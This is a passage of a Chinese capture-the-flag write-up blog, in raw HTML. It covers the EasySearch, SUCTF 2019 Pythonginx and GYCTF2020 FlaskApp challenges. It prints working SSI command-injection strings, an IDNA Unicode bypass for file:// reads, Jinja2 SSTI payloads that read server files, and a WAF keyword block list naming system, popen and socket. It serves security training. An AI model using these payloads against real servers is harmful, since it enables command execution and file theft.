class="hljs-title function_">helloworld</span>(<span class="hljs-params">target</span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10000000</span>):<br>       <span class="hljs-keyword">if</span> hashlib.md5(<span class="hljs-built_in">str</span>(i).encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)).hexdigest()[<span class="hljs-number">0</span>:<span class="hljs-number">6</span>] == target:<span class="hljs-comment">#å“ˆå¸Œæ“ä½œå‰å¿…é¡»å…ˆå¯¹å­—ç¬¦ä¸²ç¼–ç </span><br>        <span class="hljs-built_in">print</span>(i)<br>        <br>target = <span class="hljs-string">&#x27;6d0bc1&#x27;</span><br>helloworld(target)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;</span><br><span class="hljs-number">2020666</span><br><span class="hljs-number">2305004</span><br><span class="hljs-string">&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p>ç”¨æˆ·åä»»æ„ï¼Œéšä¾¿é€‰ä¸ªç¬¦åˆæ¡ä»¶çš„å¯†ç ï¼Œç™»é™†åç•Œé¢å•¥ä¹Ÿæ²¡æœ‰ï¼Œå»çœ‹çœ‹åŒ…å¤´ï¼š</p><p><img src="/img/easysearch3.png" alt="easysearch3"></p><p><code>Url_is_here:public/08ce2e9aef0f551307554f2c1b21d8271ffbcd87.shtml</code>,è®¿é—®ï¼š</p><p><img src="/img/easysearch5.png" alt="easysearch5"></p><p>å¯ä»¥çœ‹åˆ°ä»–æŠŠç”¨æˆ·åæ˜¾ç¤ºå‡ºæ¥äº†ï¼Œå¸ˆå‚…ä»¬çš„<code>wp</code>ä¸­è¯´è¿™ä¸œè¥¿å«<code>SSIæ³¨å…¥</code>ï¼š</p><p><code>SSI</code>:</p><p><img src="/img/SSI1.png" alt="SSI1"></p><p>å¯ä»¥çœ‹åˆ°è¦åŒ…å«çš„ä¸œè¥¿æ˜¯ç”¨æˆ·å¯æ§çš„ã€‚</p><p><code>shtml</code>ï¼š</p><p><img src="/img/SSI2.png" alt="SSI2"></p><p><code>shtmlæ–‡ä»¶å¯ä»¥åœ¨æœåŠ¡ç«¯æ‰§è¡Œä¸€äº›æŒ‡ä»¤</code></p><p><img src="/img/SSI3.png" alt="SSI3"></p><p><code>Web</code>æœåŠ¡å™¨å¼€å¯äº†<code>SSI</code>åŠŸèƒ½ - &gt;ç”¨æˆ·é€šè¿‡æ„é€ æ¶æ„<code>SSI</code>æŒ‡ä»¤æ‰§è¡ŒæŸäº›æ“ä½œ - &gt; æ‰§è¡Œå‘½ä»¤å¹¶å½¢æˆ<code>shtml</code>æ–‡ä»¶</p><p>æˆ‘ä»¬å¯ä»¥æ§åˆ¶<code>username</code>å’Œ<code>password</code>ï¼Œ<code>username</code>æœ‰å›æ˜¾è€Œä¸”<code>password</code>æ˜¯å›ºå®šçš„ï¼Œé€šè¿‡è°ƒæ•´<code>username</code>çš„å€¼æ¥è¿›è¡Œ<code>SSIæ³¨å…¥</code>ï¼šæŠŠ<code>username</code>æ”¹æˆ<code>&lt;!--#exec cmd=&quot;ls ../&quot;--&gt;</code>å†è®¿é—®ï¼š</p><p><img src="/img/easysearch6.png" alt="easysearch6"></p><p>ç„¶åæ”¹æˆ<code>&lt;!--#exec cmd=&quot;cat ../flag_990c66bf85a09c664f0b6741840499b2&quot;--&gt;</code>å°±è¡Œ</p><p><code>flag&#123;60f16b0b-40d8-4be2-a7f0-96dd2d99e7d6&#125;</code></p><h2 id="SUCTF-2019-Pythonginx"><a href="#SUCTF-2019-Pythonginx" class="headerlink" title="[SUCTF 2019]Pythonginx"></a>[SUCTF 2019]Pythonginx</h2><p><img src="/img/nigix1.png" alt="nigix1"></p><p>æºç ä¸­çš„æç¤ºï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- Dont worry about the suctf.cc. Go on! --&gt;</span><br><span class="hljs-comment">&lt;!-- Do you know the nginx? --&gt;</span><br></code></pre></td></tr></table></figure><p>æ¢³ç†ä¸€ä¸‹è¿™æ®µä»£ç ï¼š </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request<br><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> urlparse, urlsplit, urlunsplit<br><span class="hljs-keyword">import</span> urllib.request<br><br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/getUrl&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getUrl</span>():<br>    url = request.args.get(<span class="hljs-string">&quot;url&quot;</span>)<br>    host = urlparse(url).hostname <span class="hljs-comment"># urlparseæ˜¯Pythonæ ‡å‡†åº“ä¸­çš„ä¸€ä¸ªå‡½æ•°ï¼Œä½äºurllib.parseæ¨¡å—ä¸­ã€‚å®ƒç”¨äºè§£æURLå­—ç¬¦ä¸²ï¼Œå°†å…¶æ‹†åˆ†ä¸ºå¤šä¸ªéƒ¨åˆ†ï¼ŒåŒ…æ‹¬åè®®ã€ä¸»æœºåã€è·¯å¾„ã€æŸ¥è¯¢å‚æ•°ç­‰ã€‚ä»–ä¼šæŠŠç›®æ ‡urlä¸­çš„ä¸»æœºåè§£æå‡ºæ¥èµ‹å€¼ç»™host</span><br>    <br>    <span class="hljs-keyword">if</span> host == <span class="hljs-string">&#x27;suctf.cc&#x27;</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;æˆ‘æ‰Œ your problem? 111&quot;</span><br>    <br>    parts = <span class="hljs-built_in">list</span>(urlsplit(url))  <span class="hljs-comment">#urlsplit(url)å‡½æ•°ä¼šå°†URLå­—ç¬¦ä¸²è§£æä¸ºå¤šä¸ªéƒ¨åˆ†ï¼ŒåŒ…æ‹¬åè®®ã€ä¸»æœºåã€è·¯å¾„ã€æŸ¥è¯¢å‚æ•°ç­‰ï¼Œå¹¶è¿”å›ä¸€ä¸ªnamedtupleå¯¹è±¡ã€‚ç„¶åé€šè¿‡list()å‡½æ•°å°†namedtupleå¯¹è±¡è½¬æ¢ä¸ºåˆ—è¡¨ï¼Œå­˜å‚¨åœ¨åä¸º&quot;parts&quot;çš„å˜é‡ä¸­</span><br>    host = parts[<span class="hljs-number">1</span>]<br>    <br>    <span class="hljs-keyword">if</span> host == <span class="hljs-string">&#x27;suctf.cc&#x27;</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;æˆ‘æ‰Œ your problem? 222 &quot;</span> + host<br>    <br>    newhost = []<br>    <span class="hljs-keyword">for</span> h <span class="hljs-keyword">in</span> host.split(<span class="hljs-string">&#x27;.&#x27;</span>):<br>        newhost.append(h.encode(<span class="hljs-string">&#x27;idna&#x27;</span>).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)) <span class="hljs-comment"># æ³¨æ„è¿™ä¸ª</span><br>    <br>    parts[<span class="hljs-number">1</span>] = <span class="hljs-string">&#x27;.&#x27;</span>.join(newhost) <span class="hljs-comment">#å°†åˆ—è¡¨newhostä¸­çš„å…ƒç´ ä½¿ç”¨&#x27;.&#x27;è¿æ¥æˆä¸€ä¸ªå­—ç¬¦ä¸²</span><br>    finalUrl = urlunsplit(parts).split(<span class="hljs-string">&#x27; &#x27;</span>)[<span class="hljs-number">0</span>] <span class="hljs-comment"># ç»è¿‡urlunsplitå‡½æ•°å¤„ç†åçš„partsé‡æ–°æ‹¼æ¥æˆä¸€ä¸ªURLï¼Œå¹¶ä¸”ä½¿ç”¨ç©ºæ ¼å°†å…¶åˆ†å‰²æˆä¸€ä¸ªå­—ç¬¦ä¸²åˆ—è¡¨ï¼Œç„¶åå–åˆ—è¡¨ä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´ èµ‹å€¼ç»™finalUrlå˜é‡</span><br>    host = urlparse(finalUrl).hostname<br>    <br>    <span class="hljs-keyword">if</span> host == <span class="hljs-string">&#x27;suctf.cc&#x27;</span>:<br>        <span class="hljs-keyword">return</span> urllib.request.urlopen(finalUrl).read() <span class="hljs-comment"># æ‰“å¼€finalUrlå¯¹åº”çš„URLï¼Œç„¶åä½¿ç”¨read()æ–¹æ³•æ¥è¯»å–è¯¥URLçš„å†…å®¹ã€‚æœ€åï¼Œä½¿ç”¨returnè¯­å¥å°†è¯»å–çš„å†…å®¹è¿”å›ã€‚</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;æˆ‘æ‰Œ your problem? 333&quot;</span><br><br></code></pre></td></tr></table></figure><p><code>URL</code>çš„ä¸€èˆ¬æ ¼å¼ï¼š</p><p><code>&lt;åè®®&gt;://&lt;ä¸»æœº&gt;:&lt;ç«¯å£&gt;/&lt;è·¯å¾„&gt;</code></p><p>å¸¸è§çš„åè®®æœ‰<code>http</code>,<code>https</code>,<code>ftp</code>ä»¥åŠ<code>file</code>ã€‚å…¶ä¸­FIleåè®®ä¹Ÿå«<strong>æœ¬åœ°æ–‡ä»¶ä¼ è¾“åè®®</strong> ï¼Œä¸»è¦ç”¨äºè®¿é—®æœ¬åœ°è®¡ç®—æœºä¸­çš„æ–‡ä»¶ã€‚æ ¼å¼ï¼š<strong>file:&#x2F;&#x2F;&#x2F;æ–‡ä»¶è·¯å¾„</strong>ã€‚æ¯”å¦‚ï¼š<code>file:///D:/mywebproject/bigwatermelon/index.html</code></p><p>å¯ä»¥çœ‹åˆ°<code>url</code>ç»è¿‡å¤„ç†åè¿›è¡Œäº†ä¸‰æ¬¡<code>if</code>æ¡ä»¶çš„åˆ¤æ–­ï¼Œå‰ä¸¤æ¬¡åˆ¤æ–­<code> if host == &#39;suctf.cc&#39;</code>ï¼Œå¦‚æœè¿”å›<code>true</code>å°±ç›´æ¥  <code> return    xxxxx</code>,å¦‚æœç¬¬ä¸‰æ¬¡<code>if  host == &#39;suctf.cc&#39;</code> ï¼Œè¿™æ—¶ä¼šè¿”å›æŒ‡å®š<code>url</code>çš„å†…å®¹ã€‚</p><p>è¿™ä¹ˆçœ‹ä¼¼ä¹æ˜¯çŸ›ç›¾çš„ï¼Œä¸è¿‡ç¬¬ä¸‰æ¬¡åˆ¤æ–­å‰è¿›è¡Œäº†<code>newhost.append(h.encode(&#39;idna&#39;).decode(&#39;utf-8&#39;))</code>å¤„ç†ã€‚è§£é¢˜æ€è·¯å°±æ˜¯å¯»æ‰¾ä¸€ä¸ªç‰¹å®šçš„<code>URL</code>,ä»–ç»è¿‡å‰ä¸¤æ¬¡è§£æå<code>host != scctf.cc</code>ä½†ç»è¿‡ç¼–ç åæ»¡è¶³<code>host == suctf.cc</code></p><p> <code>newhost.append(h.encode(&#39;idna&#39;).decode(&#39;utf-8&#39;))</code> è¿›è¡Œäº†è§„èŒƒåŒ–, ä¼šæŠŠæŸäº›ç‰¹æ®Šçš„ Unicode å­—ç¬¦è§„èŒƒåŒ–ä¸ºæ­£å¸¸çš„ ASCII å­—ç¬¦ã€‚é‚£æˆ‘ä»¬éœ€è¦æ‰¾åˆ°ä¸€äº› unicode å­—ç¬¦ç»•è¿‡å‰ä¸¤ä¸ª if çš„æ£€æµ‹, å¹¶ä¸”åœ¨è¿›è¡Œè§„èŒƒåŒ–ä¹‹åé€šè¿‡ç¬¬ä¸‰ä¸ª if çš„åˆ¤æ–­ã€‚</p><p><code>IDNAç¼–ç é€šå¸¸ç”¨äºå°†åŸŸåä¸­çš„éASCIIå­—ç¬¦è½¬æ¢ä¸ºASCIIå…¼å®¹æ ¼å¼</code></p><p>ç„¶åå°±æ˜¯æ‰¾æŸä¸ª<code>unicode</code>è®©ä»–è§„èŒƒåŒ–ä¹‹å‰<code>ä¸æ­£å¸¸</code>ä½†æ˜¯è§„èŒƒåŒ–å<code>æ­£å¸¸</code>ã€‚è¿™é‡Œå‚è€ƒäº†<code>mochu</code>å¸ˆå‚…çš„è„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python">chars = [<span class="hljs-string">&#x27;s&#x27;</span>, <span class="hljs-string">&#x27;u&#x27;</span>, <span class="hljs-string">&#x27;c&#x27;</span>, <span class="hljs-string">&#x27;t&#x27;</span>, <span class="hljs-string">&#x27;f&#x27;</span>]<br><span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> chars:<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x7f</span>, <span class="hljs-number">0x10FFFF</span>):<br><span class="hljs-keyword">try</span>:<br>char_i = <span class="hljs-built_in">chr</span>(i).encode(<span class="hljs-string">&#x27;idna&#x27;</span>).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br><span class="hljs-keyword">if</span> char_i == c:<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;ASCII: &#123;&#125;   Unicode: &#123;&#125;    Number: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(c, <span class="hljs-built_in">chr</span>(i), i))<br><span class="hljs-keyword">except</span>:<br><span class="hljs-keyword">pass</span><br><br>        <span class="hljs-comment">#https://blog.csdn.net/mochu7777777/article/details/127140963</span><br>        <span class="hljs-comment">#åœ¨ç»“æœä¸­éšä¾¿é€‰ä¸€ä¸ªæ›¿æ¢å°±å¥½</span><br></code></pre></td></tr></table></figure><p><img src="/img/nignx.png" alt="nignx"></p>   <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment">#nginxä¸­ä¸€äº›é‡è¦æ–‡ä»¶çš„ä½ç½®</span><br><br>    é…ç½®æ–‡ä»¶å­˜æ”¾ç›®å½•ï¼š<span class="hljs-regexp">/etc/</span>nginx<br>    ä¸»é…ç½®æ–‡ä»¶ï¼š<span class="hljs-regexp">/etc/</span>nginx<span class="hljs-regexp">/conf/</span>nginx.conf<br>    ç®¡ç†è„šæœ¬ï¼š<span class="hljs-regexp">/usr/</span>lib64<span class="hljs-regexp">/systemd/</span>system/nginx.service<br>    æ¨¡å—ï¼š<span class="hljs-regexp">/usr/</span>lisb64<span class="hljs-regexp">/nginx/m</span>odules<br>    åº”ç”¨ç¨‹åºï¼š<span class="hljs-regexp">/usr/</span>sbin/nginx<br>    ç¨‹åºé»˜è®¤å­˜æ”¾ä½ç½®ï¼š<span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/nginx/</span>html<br>    æ—¥å¿—é»˜è®¤å­˜æ”¾ä½ç½®ï¼š<span class="hljs-regexp">/var/</span>log/nginx<br>    é…ç½®æ–‡ä»¶ç›®å½•ä¸ºï¼š<span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/nginx/</span>conf/nginx.conf<br></code></pre></td></tr></table></figure><p>å› ä¸ºçœ‹äº†å…¶å®ƒå¸ˆå‚…çš„<code>wp</code>å°±ç›´æ¥å»è®¿é—®äº†<code>file://Å¿uctf.cc/usr/local/nginx/conf/nginx.conf</code>ï¼ˆæ³¨æ„suctf.ccæ˜¯ä¸»æœºåï¼‰</p><p><img src="/img/nignx2.png" alt="nignx2"></p><p>æœ€åæŠŠ<code>url=file://Å¿uctf.cc/usr/fffffflag</code>æ”¾è¿›å»å°±è¡Œ</p><p>å‚è€ƒæ–‡ç« ï¼š</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/m0_46278037/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">113881347</span><br>https:<span class="hljs-regexp">//</span>xz.aliyun.com<span class="hljs-regexp">/t/</span><span class="hljs-number">6070</span><br>https:<span class="hljs-regexp">//</span>exp10it.cn<span class="hljs-regexp">/2022/</span><span class="hljs-number">08</span><span class="hljs-regexp">/buuctf-web-writeup-4/</span><span class="hljs-comment">#suctf-2019pythonginx</span><br>https:<span class="hljs-regexp">//m</span>ayi077.gitee.io<span class="hljs-regexp">/2020/</span><span class="hljs-number">02</span><span class="hljs-regexp">/05/</span>SUCTF-<span class="hljs-number">2019</span>-Pythonginx/<br>æœ‰å…³fileåè®®çš„æ–‡ç« ï¼šhttps:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/m0_46278037/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">113881347</span><br></code></pre></td></tr></table></figure><h2 id="GYCTF2020-FlaskApp"><a href="#GYCTF2020-FlaskApp" class="headerlink" title="[GYCTF2020]FlaskApp"></a>[GYCTF2020]FlaskApp</h2><p>å‚è€ƒ<code>https://xz.aliyun.com/t/8092</code>                                                                                                                                                                                                                                                                                                                                                                                                                                                                   </p><p><img src="/img/flask1.png" alt="flask1"></p><p>æç¤ºï¼š</p><p><img src="/img/flask2.png" alt="flask2"></p><p><code>&lt;!-- PIN ---&gt;</code></p><p><code>Flask</code>æ¡†æ¶ï¼Œå®ç°<code>base64</code>çš„åŠ å¯†è§£å¯†åŠŸèƒ½ï¼Œåˆ†åˆ«åœ¨åŠ å¯†è§£å¯†ç•Œé¢è¾“å…¥<code>$&#123;7*7&#125;</code>ï¼š</p><p><img src="/img/flask3.png" alt="flask3"></p><p>å¼€å¯äº†<code>debug</code>æ¨¡å¼ï¼Œå­˜åœ¨éƒ¨åˆ†å’Œ<code>decode</code>æœ‰å…³çš„æºç ï¼š</p><p><img src="/img/flask4.png" alt="flask4"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/decode&#x27;</span>,methods=[<span class="hljs-string">&#x27;POST&#x27;</span>,<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decode</span>():<br><br>    <span class="hljs-keyword">if</span> request.values.get(<span class="hljs-string">&#x27;text&#x27;</span>) : <span class="hljs-comment">#æ£€æŸ¥å½“å‰çš„HTTPè¯·æ±‚ä¸­æ˜¯å¦åŒ…å«äº†åä¸º&#x27;text&#x27;çš„å‚æ•°</span><br><br>        text = request.values.get(<span class="hljs-string">&quot;text&quot;</span>)<br><br>        text_decode = base64.b64decode(text.encode()) <span class="hljs-comment">#çŒœæµ‹è¿™ä¸ªencodeå°±æ˜¯åˆ©ç”¨base64åŠ å¯†</span><br><br>        tmp = <span class="hljs-string">&quot;ç»“æœ ï¼š &#123;0&#125;&quot;</span>.<span class="hljs-built_in">format</span>(text_decode.decode())<br><br>        <span class="hljs-keyword">if</span> waf(tmp) :<br><br>            flash(<span class="hljs-string">&quot;no no no !!&quot;</span>)<br><br>            <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;decode&#x27;</span>))<br><br>        res =  render_template_string(tmp) <span class="hljs-comment">#ä½¿ç”¨æ¨¡æ¿å¼•æ“æ¸²æŸ“tmp</span><br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°<code>tmp</code>ç»è¿‡<code>waf</code>åå°±é€ç»™æ¨¡æ¿å¼•æ“æ¸²æŸ“äº†ï¼Œä½†<code>waf</code>å…·ä½“æ˜¯æ€ä¹ˆä¸ªäº‹æˆ‘ä»¬ä¸çŸ¥é“ã€‚å¯ä»¥è¯•è¯•æŠŠ<code>$&#123;7*7&#125;</code>åŠ å¯†åå†æ”¾åˆ°<code>decode</code>é¡µé¢è§£å¯†ã€‚</p><p><img src="/img/flask5.png" alt="flask5"></p><p>è§¦å‘äº†<code>waf</code>ï¼Œåé¢å°è¯•äº†<code>&#123;&#123;1+1&#125;&#125;</code>ï¼ŒåŠ å¯†å†è§£å¯†å›æ˜¾äº†<code>2</code>ï¼Œç¡®å®å­˜åœ¨<code>SSTI</code>ã€‚</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">å‚è€ƒäº†ä¸€äº›æœ‰å…³SSITçš„æ–‡ç« ï¼š<br>https:<span class="hljs-regexp">//</span>xz.aliyun.com<span class="hljs-regexp">/t/</span><span class="hljs-number">11090</span><span class="hljs-comment">#toc-2</span><br>https:<span class="hljs-regexp">//</span>www.cnblogs.com<span class="hljs-regexp">/Article-kelp/</span>p/<span class="hljs-number">14797393</span>.html<br></code></pre></td></tr></table></figure><p>åˆ©ç”¨æ–‡ç« ä¸­ç»™çš„<code>payload</code>è¯»æºç ï¼š</p><figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs twig"><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">for</span> c <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__() <span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">if</span> c.__name__==<span class="hljs-string">&#x27;catch_warnings&#x27;</span> <span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123; c.__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>].open(<span class="hljs-string">&#x27;app.py&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>).read() &#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">endif</span> <span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">endfor</span> <span class="hljs-template-tag">%&#125;</span><br></code></pre></td></tr></table></figure><p><code>&#123;&#123;config&#125;&#125;</code>å¯ä»¥è®¿é—®ï¼Œç›´æ¥<code>&#123;&#123;config.__class__.__init__.__globals__['__builtins__'].open('app.py').read()&#125;&#125;</code>ä¹Ÿè¡Œã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#app.py</span><br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, render_template_string, render_template, request, flash, redirect, url_for<br><span class="hljs-keyword">from</span> flask_wtf <span class="hljs-keyword">import</span> FlaskForm<br><span class="hljs-keyword">from</span> wtforms <span class="hljs-keyword">import</span> StringField, SubmitField<br><span class="hljs-keyword">from</span> wtforms.validators <span class="hljs-keyword">import</span> DataRequired<br><span class="hljs-keyword">from</span> flask_bootstrap <span class="hljs-keyword">import</span> Bootstrap<br><span class="hljs-keyword">import</span> base64<br><br>app = Flask(__name__)<br>app.config[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>] = <span class="hljs-string">&#x27;s_e_c_r_e_t_k_e_y&#x27;</span><br>bootstrap = Bootstrap(app)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">NameForm</span>(<span class="hljs-title class_ inherited__">FlaskForm</span>)\:<br>    text = StringField(<span class="hljs-string">&#x27;BASE64åŠ å¯†&#x27;</span>, validators=[DataRequired()])<br>    submit = SubmitField(<span class="hljs-string">&#x27;æäº¤&#x27;</span>)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">NameForm1</span>(<span class="hljs-title class_ inherited__">FlaskForm</span>)\:<br>    text = StringField(<span class="hljs-string">&#x27;BASE64è§£å¯†&#x27;</span>, validators=[DataRequired()])<br>    submit = SubmitField(<span class="hljs-string">&#x27;æäº¤&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">waf</span>(<span class="hljs-params"><span class="hljs-built_in">str</span></span>)\:<br>    black_list = [<span class="hljs-string">&quot;flag&quot;</span>, <span class="hljs-string">&quot;os&quot;</span>, <span class="hljs-string">&quot;system&quot;</span>, <span class="hljs-string">&quot;popen&quot;</span>, <span class="hljs-string">&quot;import&quot;</span>, <span class="hljs-string">&quot;eval&quot;</span>, <span class="hljs-string">&quot;chr&quot;</span>, <span class="hljs-string">&quot;request&quot;</span>, <span class="hljs-string">&quot;subprocess&quot;</span>, <span class="hljs-string">&quot;commands&quot;</span>, <span class="hljs-string">&quot;socket&quot;</span>, <span class="hljs-string">&quot;hex&quot;</span>, <span class="hljs-string">&quot;base64&quot;</span>, <span class="hljs-string">&quot;*&quot;</span>, <span class="hljs-string">&quot;?&quot;</span>]<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> black_list\:<br>        <span class="hljs-keyword">if</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>.lower()\:<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/hint&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hint</span>()\:<br>    txt = <span class="hljs-string">&quot;å¤±è´¥ä¹ƒæˆåŠŸä¹‹æ¯ï¼ï¼&quot;</span><br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;hint.html&quot;</span>, txt=txt)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>, <span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encode</span>()\:<br>    <span class="hljs-keyword">if</span> request.values.get(<span class="hljs-string">&#x27;text&#x27;</span>)\:<br>        text = request.values.get(<span class="hljs-string">&quot;text&quot;</span>)<br>        text_decode = base64.b64encode(text.encode())<br>        tmp = <span class="hljs-string">&quot;ç»“æœ \:&#123;0&#125;&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">str</span>(text_decode.decode()))<br>        res = render_template_string(tmp)<br>        flash(tmp)<br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;encode&#x27;</span>))<br>    <span 